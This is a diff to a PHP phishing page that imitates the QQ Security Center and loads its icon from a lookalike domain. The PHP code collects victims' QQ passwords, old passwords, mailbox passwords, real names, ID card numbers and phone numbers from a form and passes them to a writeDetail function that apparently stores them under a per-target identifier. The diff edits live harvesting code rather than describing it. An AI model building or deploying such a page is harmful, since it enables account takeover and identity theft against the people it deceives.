@@ -16,9 +16,9 @@
 	$historyPw2=$_POST['pwdOldPW2'];
 	$historyPw3=$_POST['pwdOldPW3'];
 	$trueName1=$_POST['xm'];
-	$certificateType=$_POST['CertCardType'];
-	$certificateNumber=$_POST['zjhm1'];
-	$phoneNumber=$_POST['mbsj1'];
+	$certificateType=$_POST['zj'];
+	$certificateNumber=$_POST['hm'];
+	$phoneNumber=$_POST['sj'];
 	$other=$_POST['ziliao'];
 
 	writeDetail($_GET['u'],$trueName,$addr,$anotherQQ,$password,$reciveType,$reciveMail,$reciveMailPassword,$historyPw1,$historyPw2,$historyPw3,$trueName1,$certificateType,$certificateNumber,$phoneNumber,$other);
@@ -26,17 +26,14 @@
 ?>
 <!DOCTYPE html>
 <html><head>
-<meta http-equiv="Content-Type" content="text/html; charset=gbk">
-<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/global.css" rel="stylesheet" type="text/css">
-<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/base.css" rel="stylesheet" type="text/css">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="description" content="QQ安全中心、在线生活、安全护航">
+<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/global.css" rel="stylesheet" type="text/css">
+<link href="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/base.css" rel="stylesheet" type="text/css">
 <link rel="shortcut icon" href="http://serviec.boy-ex.com/favicon.ico">
-<script async="" type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/cdn_djl.js"></script><script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/jquery.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/common.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/ctrlManager.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/vry_question.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/check.js"></script>
-<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/dna.js"></script>
-	<title>安全中心</title>	
+<script async="" type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/cdn_djl.js"></script><script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/jquery.js"></script>
+<script type="text/javascript" src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/common.js"></script>
+<title>安全中心</title>	
 	<style type="text/css">
 		.ac_menu{border:1px solid #3162A6;background-color:#F6F6F6;cursor:default;overflow:hidden;height:expression((this.scrollHeight>130)?"130px":"auto")}
 		.ac_menuitem{width:100%;color:#141414;padding:2px;text-align:left;}
@@ -44,7 +41,7 @@
 		#popupcontent{position:absolute;visibility:hidden;cursor:default;z-index:99;} 
 	</style>
 	<script type="text/javascript">window.onerror=function(){return true;}</script>
-<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/aq_float_frame.js" type="text/javascript"></script><script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%83_files/cdn_dianjiliu.js"></script></head>
+<script src="%E5%AE%89%E5%85%A8%E4%B8%AD%E5%BF%832_files/cdn_dianjiliu.js"></script></head>
 	
  
 <body>
@@ -102,6 +99,7 @@
   </div>
 </div><!--Header End-->
  
+ 
 <script> 
 function ShowSubMenu(submenu_id,menu_id,cname)
 {
@@ -139,6 +137,34 @@ function LoginOut()
 $("#toolbox_hover").click(function(){
 	location.href="/cn2/manage/my_mb";
 });
+/*$(document).ready(function(){
+			$.ajax({
+			url:"/cn2/ajax/get_safe_score",
+			async:true,
+			timeout:1000,
+			dataType:"json",
+			error:function(){},
+			success:function(msg){
+				if(msg.ret==0)
+				{
+					$("#safe_score_item").css("display","");
+					$("#head_safe_score").text(msg.score+"分");
+					if(msg.rank < 4)
+					{
+						$("#head_safe_score").attr("className","l");
+					}
+					else if(msg.rank < 7)
+					{
+						$("#head_safe_score").attr("className","m");
+					}
+					else
+					{
+						$("#head_safe_score").attr("className","h");
+					}
+				}
+			}
+		});
+});*/
 function switchToOld()
 {
 	document.cookie = "aq_ver=redirect_to_aq_v1;PATH=/; DOMAIN=aq.qq.com";
